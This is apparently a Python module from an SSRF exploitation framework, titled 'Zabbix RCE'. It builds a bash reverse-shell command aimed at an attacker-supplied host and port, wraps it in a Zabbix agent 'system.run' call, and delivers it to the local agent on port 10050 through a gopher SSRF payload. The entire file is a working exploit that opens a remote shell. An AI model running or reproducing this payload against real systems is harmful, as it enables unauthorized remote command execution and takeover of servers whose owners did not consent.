from core.utils import *
import logging
import urllib.parse as urllib

name        = "zabbix"
description = "Zabbix RCE"
author      = "Swissky"

class exploit():

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))

        # Data for the service
        ip   = "127.0.0.1"
        port = "10050"
        cmd = "bash -i >& /dev/tcp/SERVER_HOST/SERVER_PORT 0>&1"
        cmd = urllib.quote_plus(cmd).replace("+","%20")
        cmd = cmd.replace("%2F","/")
        cmd = cmd.replace("%25","%")
        cmd = cmd.replace("%3A",":")
        data = "system.run[(" + cmd + ");sleep 2s]"

        # Handle args for reverse shell
        if args.lhost == None: data = data.replace("SERVER_HOST", input("Server Host:"))
        else:                  data = data.replace("SERVER_HOST", args.lhost)

        if args.lport == None: data = data.replace("SERVER_PORT", input("Server Port:"))
        else:                  data = data.replace("SERVER_PORT", args.lport)
        
        payload = wrapper_gopher(data, ip , port)
        logging.info("Generated payload : {}".format(payload))

        # Send the payload
        r = requester.do_request(args.param, payload)